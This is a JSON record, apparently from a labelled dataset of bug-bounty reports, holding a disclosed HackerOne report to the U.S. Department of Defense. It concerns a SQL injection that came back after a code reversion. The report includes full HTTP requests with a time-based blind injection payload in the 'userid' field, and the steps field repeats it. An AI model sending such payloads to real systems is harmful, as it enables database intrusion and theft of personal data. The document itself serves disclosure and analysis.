@@ -1,0 +1,45 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "alyssa_herrera ",
+    "title": "Code reversion allowing SQLI again in \u2588\u2588\u2588\u2588\u2588\u2588\u2588",
+    "content": "\nSummary:\nI just noticed that my publicly disclosed report, https://hackerone.com/reports/311922 is sstill vulnerable either a code reversion was made or something was done to revert the patch. Additionally I'd please request that the images in the report to be censored or redacted as it's been made vulnerable again.\nDescription:\nA code reversion made a previously patched sql injection vulnerable, allowing attackers to once again attack and access the back end DB.\n## Impact\nHigh\n## Step-by-step Reproduction Instructions\nPOST /elist/email_aba.php HTTP/1.1\nHost: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://\u2588\u2588\u2588\u2588\u2588/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 69\nCookie: OAMAuthnHintCookie=0@1517649796; TS01166aa9=01caaf3a630ce6defa1b153492b912f5f19f77c7731c0b860a649ade64c8b998a2227a4ae08ffa824957ddb7a4d434ec99039bc515480c43c91adc79831b92a6c4668a4efd; PHPSESSID=1dc251336b401258c094229326d3d955\nConnection: close\nUpgrade-Insecure-Requests: 1\nlname=S&userid=admin'%2b(select*from(select(sleep(3)))a)%2b'&pw=admin\nvs\nPOST /elist/email_aba.php HTTP/1.1\nHost: \u2588\u2588\u2588\u2588\u2588\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 69\nCookie: OAMAuthnHintCookie=0@1517649796; TS01166aa9=01caaf3a630ce6defa1b153492b912f5f19f77c7731c0b860a649ade64c8b998a2227a4ae08ffa824957ddb7a4d434ec99039bc515480c43c91adc79831b92a6c4668a4efd; PHPSESSID=1dc251336b401258c094229326d3d955\nConnection: close\nUpgrade-Insecure-Requests: 1\nlname=S&userid=admin'%2b(select*from(select(sleep(0)))a)%2b'&pw=admin\nProduct, Version, and Configuration (If applicable)\nN/a\n## Suggested Mitigation/Remediation Actions\nTake down subdomain if not needed any more\nImpact\nAccess database information, steal sensitive PII or information\nThe hacker selected the SQL Injection weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:\nVerified\nYes\nWhat exploitation technique did you utilize?\nTime delay\nPlease describe the results of your verification attempt.\nObserved time delays when using sleep comands\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "SQL Injection"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1570574940,
+    "report_url": "https://hackerone.com/reports/348047",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Send a POST request to /elist/email_aba.php with a malicious SQL injection payload in the 'userid' parameter, such as: admin'%2b(select*from(select(sleep(3)))a)%2b'"
+        ],
+        [
+            2,
+            "Observe the response time delay indicating successful SQL injection execution"
+        ]
+    ],
+    "vuln_description": "A previously patched SQL injection vulnerability has been reintroduced due to a code reversion, allowing attackers to execute arbitrary SQL commands and potentially access sensitive database information.",
+    "reason": "The vulnerability involves a straightforward SQL injection technique using time-based delays, which is a well-known and commonly tested attack vector. The attack does not require complex application state manipulation or understanding of subtle interactions between components.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": "311922",
+    "injection_metadata": {
+        "is_simple_payload": true
+    },
+    "authnz_metadata": {
+        "reason": "The SQL injection vulnerability involves direct manipulation of SQL queries through user input, which is not directly related to authentication or authorization boundaries. The methodology described focuses on testing authorization boundaries by swapping user sessions or resource IDs, not on detecting SQL injection vulnerabilities.",
+        "is_detectable": false
+    }
+}
